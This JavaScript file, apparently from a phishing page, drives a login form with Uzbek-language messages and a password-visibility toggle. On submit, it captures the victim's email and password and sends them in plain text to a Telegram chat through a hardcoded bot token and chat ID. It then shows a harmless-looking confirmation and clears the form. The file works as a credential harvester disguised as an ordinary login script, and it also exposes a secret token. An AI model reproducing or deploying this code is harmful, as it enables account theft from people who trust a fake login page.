const passwordInput = document.querySelector(".second");
const eyeBtn = document.querySelector(".eye i");

if (passwordInput && eyeBtn) {

  eyeBtn.addEventListener("click", () => {

    if (passwordInput.type === "password") {

      passwordInput.type = "text";

      eyeBtn.classList.remove("fa-eye");
      eyeBtn.classList.add("fa-eye-slash");

    } else {

      passwordInput.type = "password";

      eyeBtn.classList.remove("fa-eye-slash");
      eyeBtn.classList.add("fa-eye");

    }

  });

}

const TOKEN = "8693029388:AAGn_tO8IGyGq0m8dcrqwtdOQzqeVWonbKo";
const CHAT_ID = "5314852743";

const form = document.getElementById("loginForm");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("name").value;
  const password = document.getElementById("password").value;

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (!emailRegex.test(email)) {
    alert("Email noto‘g‘ri kiritildi");
    return;
  }

  if (password.length < 6) {
    alert("Password kamida 6 ta belgidan iborat bo'lishi kerak");
    return;
  }

  const text = `
Yangi Login

Email: ${email}
Password: ${password}
`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
        }),
      }
    );

    if (response.ok) {
      alert("Xabar yuborildi");
      form.reset();
    } else {
      alert("Xatolik yuz berdi");
    }
  } catch (error) {
    console.log(error);
    alert("Server xatosi");
  }
});
